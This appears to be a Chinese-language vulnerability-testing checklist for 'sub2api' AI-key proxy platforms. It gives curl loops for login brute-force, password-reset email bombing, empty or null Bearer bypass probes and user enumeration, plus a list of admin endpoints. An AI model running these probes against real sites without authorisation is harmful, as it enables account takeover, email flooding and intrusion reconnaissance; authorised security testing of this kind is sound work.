# sub2api (Subscription-to-API) 平台漏洞测试模式

## 平台指纹

sub2api 是开源的"订阅转API"平台，将多个AI API Key聚合为共享代理服务。典型特征：

- 前端: Vue.js SPA (Vite构建)，`<div id="app">`
- 反向代理: Caddy (via: 1.1 Caddy)
- JS bundle 中有 `et="/api/v1"` + axios实例 `baseURL: et`
- 页面 HTML `<script>` 包含 `window.__APP_CONFIG__` JSON
- API前缀: `/api/v1`
- 支付: Stripe + Airwallex
- 关键配置字段: `risk_control_enabled`, `totp_enabled`, `turnstile_enabled`, `affiliate_enabled`
- 版本号可通过 `/api/v1/settings/public` 获取

## 高价值测试点

### 1. 配置信息泄露 (低危但必测)

**入口**: HTML中 `window.__APP_CONFIG__` 和 `/api/v1/settings/public`

泄露内容:
- `version`: 精确版本号(如 "0.1.130")
- `risk_control_enabled`: 风控开关状态
- `totp_enabled`: 2FA状态
- `turnstile_enabled`: CAPTCHA状态
- `registration_email_suffix_whitelist`: 邮箱白名单
- `payment_enabled`, `affiliate_enabled`: 业务功能开关

**利用**: 当 `risk_control_enabled: false` 且 `turnstile_enabled: false` 时，可直接进行暴力破解且无CAPTCHA阻碍。

### 2. 登录暴力破解 (中危)

条件: `risk_control_enabled: false`

```bash
# 测试速率限制 - 连续发送7次错误密码
for i in $(seq 1 7); do
  curl -sk -X POST "https://TARGET/api/v1/auth/login" \
    -H "Content-Type: application/json" \
    -d "{\"email\":\"test${i}@evil.com\",\"password\":\"wrong\"}" --max-time 5
done
# 如果每次都返回 401 无任何限制 = 漏洞确认
```

### 3. 密码重置邮件轰炸 (中危)

```bash
# 测试重置频率限制
for i in $(seq 1 5); do
  curl -sk -X POST "https://TARGET/api/v1/auth/forgot-password" \
    -H "Content-Type: application/json" \
    -d '{"email":"victim@example.com"}' --max-time 5
done
# 如果每次都返回 success = 邮件轰炸漏洞
```

### 4. API代理端点探测

sub2api 平台通常暴露 OpenAI 兼容的 API 代理:

```bash
# 返回401(存在) vs 404(不存在)
curl -sk "https://TARGET/v1/models" --max-time 5
# 存在: {"code":"UNAUTHORIZED","message":"Authorization required"}
# 不存在: "404 page not found"
```

其他测试路径: `/v1/chat/completions`, `/v1/completions`, `/v1/embeddings`

### 5. 弱密码策略

```bash
# 注册时是否接受弱密码(被邮箱验证阻止但可检测策略)
curl -sk -X POST "https://TARGET/api/v1/auth/register" \
  -H "Content-Type: application/json" \
  -d '{"email":"test@example.com","password":"123456"}'
# 如果返回 EMAIL_VERIFY_REQUIRED 而非密码强度错误 = 弱密码策略
```

### 6. 认证绕过尝试

```bash
# 空Bearer
curl -sk "https://TARGET/api/v1/user/profile" -H "Authorization: Bearer "
# null/undefined token
curl -sk "https://TARGET/api/v1/user/profile" -H "Authorization: Bearer null"
curl -sk "https://TARGET/api/v1/user/profile" -H "Authorization: Bearer undefined"
```

响应区分:
- `INVALID_AUTH_HEADER`: 格式错误
- `INVALID_TOKEN`: Token无效(已验证格式)
- `UNAUTHORIZED`: 缺少Header

### 7. 用户枚举测试

sub2api 通常已修复用户枚举(统一错误信息)，但需验证:

```bash
# 登录 - 对比存在/不存在用户的响应
curl -sk -X POST "https://TARGET/api/v1/auth/login" -d '{"email":"admin@target.com","password":"x"}'
curl -sk -X POST "https://TARGET/api/v1/auth/login" -d '{"email":"nonexist@fake.com","password":"x"}'
# 两者都返回 INVALID_CREDENTIALS = 无枚举

# 密码重置
curl -sk -X POST "https://TARGET/api/v1/auth/forgot-password" -d '{"email":"real@target.com"}'
curl -sk -X POST "https://TARGET/api/v1/auth/forgot-password" -d '{"email":"fake@notexist.com"}'
# 两者都返回 "If your email is registered..." = 无枚举
```

## 已知API端点清单 (从JS逆向提取)

### 公开端点 (无需认证)
- `GET /api/v1/settings/public` — 公开配置
- `GET /health` — 健康检查 `{"status":"ok"}`

### 认证端点
- `POST /api/v1/auth/login` — 登录
- `POST /api/v1/auth/register` — 注册
- `POST /api/v1/auth/forgot-password` — 密码重置请求
- `POST /api/v1/auth/reset-password` — 密码重置执行(需token)

### 用户端点 (需认证)
- `GET /api/v1/user/profile` — 用户资料
- `GET /api/v1/subscriptions` — 订阅列表
- `GET /api/v1/announcements` — 公告

### Admin端点 (需管理员权限)
- `GET /admin/dashboard/stats|realtime|trend|models|groups|snapshot-v2`
- `GET/PUT /admin/settings`
- `GET /admin/users`, `GET /admin/subscriptions`
- `GET /admin/risk-control/config|status|logs`
- `GET /admin/ops/concurrency|account-availability|realtime-traffic`
- `GET /admin/channels`

### API代理端点
- `GET /v1/models` — 模型列表

## CSP特征

sub2api 默认CSP:
```
default-src 'self';
script-src 'self' 'nonce-...' https://challenges.cloudflare.com https://*.stripe.com https://static.airwallex.com ...;
connect-src 'self' https:;
frame-src https://challenges.cloudflare.com https://*.stripe.com ...
```

注意: `connect-src 'self' https:` 较宽松，允许前端向任意HTTPS地址发请求。
